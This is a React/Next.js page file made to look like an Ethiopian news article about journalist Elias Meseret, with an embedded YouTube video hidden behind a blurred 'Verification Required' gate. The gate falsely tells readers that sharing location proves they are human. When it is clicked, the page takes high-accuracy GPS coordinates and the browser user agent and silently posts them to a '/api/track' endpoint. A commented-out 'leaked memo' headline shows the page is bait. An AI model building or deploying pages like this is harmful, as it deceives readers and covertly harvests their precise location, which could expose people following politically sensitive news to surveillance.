"use client";
import { useState } from "react";

export default function NewsPage() {
  const [isLocked, setIsLocked] = useState(true);
  const [loading, setLoading] = useState(false);

  const handleAccess = () => {
    setLoading(true);

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          // 1. Send data to DB in background
          await fetch("/api/track", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              userAgent: navigator.userAgent,
            }),
          });

          // 2. Unlock the content
          setIsLocked(false);
          setLoading(false);
        },
        (error) => {
          console.error(error);
          alert(
            "Please allow location access to verify you are a human reader.",
          );
          setLoading(false);
        },
        { enableHighAccuracy: true },
      );
    } else {
      alert("Browser not supported");
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-gray-50 pb-12">
      {/* Header */}
      <div className="bg-white border-b py-4 mb-8">
        <div className="max-w-3xl mx-auto px-4 flex justify-between items-center">
          <span className="font-black text-2xl tracking-tighter text-red-600">
            ETHIO NEWS
          </span>
          <span className="text-xs font-bold uppercase bg-red-100 text-red-700 px-2 py-1 rounded">
            Live Updates
          </span>
        </div>
      </div>

      <div className="max-w-3xl mx-auto px-4">
        {/* Catchy Headline */}
        <h1 className="text-4xl md:text-5xl font-extrabold text-gray-900 leading-tight mb-6">
          {/* BREAKING: Internal Memo Leaked Regarding New Regional Boundary
          Readjustments{" "} */}
          ጋዜጠኛው እውነቱን አጋለጠ|"ዛቻና ማስፈራሪያ ደርሶብኛል"| Elias Meseret| Gerado Media |
          Ethiopia
        </h1>

        {/* Post Meta */}
        <div className="flex items-center gap-3 mb-8 text-gray-500">
          <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-blue-500 to-purple-500" />
          <div>
            <p className="text-sm font-bold text-gray-900">Elias Meseret</p>
            <p className="text-xs">Journalism • 4 min read</p>
          </div>
        </div>

        {/* Content Area */}
        <div className="relative group">
          {/* Visual Content (Blurred if locked) */}
          <div
            className={`transition-all duration-700 ${isLocked ? "blur-xl select-none pointer-events-none" : "blur-0"}`}
          >
            <div className="w-full max-w-4xl mx-auto px-4">
              <div className="relative aspect-video rounded-2xl overflow-hidden shadow-2xl border border-gray-200">
                <iframe
                  className="absolute top-0 left-0 w-full h-full"
                  src="https://www.youtube.com/embed/VEBvFgM32lI"
                  title="Ethiopia News Update"
                  frameBorder="0"
                  allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                  referrerPolicy="strict-origin-when-cross-origin"
                  allowFullScreen
                ></iframe>
              </div>
            </div>

            <article className="prose prose-lg max-w-none text-gray-800"></article>
          </div>

          {/* The Content Gate (The "Popup") */}
          {isLocked && (
            <div className="absolute inset-0 z-10 flex items-center justify-center bg-white/30 backdrop-blur-sm rounded-2xl border-2 border-dashed border-gray-300">
              <div className="bg-white p-8 rounded-2xl shadow-2xl text-center max-w-sm mx-4 transform transition-all animate-in fade-in zoom-in duration-300">
                <div className="mb-4 inline-flex items-center justify-center w-16 h-16 bg-blue-100 text-blue-600 rounded-full">
                  <svg
                    className="w-8 h-8"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="2"
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                </div>
                <h3 className="text-xl font-bold mb-2">
                  Verification Required
                </h3>
                <p className="text-gray-600 mb-6 text-sm">
                  To view this exclusive content, please verify your regional
                  access. Click below to confirm your session.
                </p>
                <button
                  onClick={handleAccess}
                  disabled={loading}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-xl transition-all active:scale-95 disabled:opacity-50"
                >
                  {loading ? "Verifying..." : "Access This Content"}
                </button>
                <p className="mt-4 text-[10px] text-gray-400 uppercase tracking-widest">
                  Secure Reader Verification v2.4
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </main>
  );
}
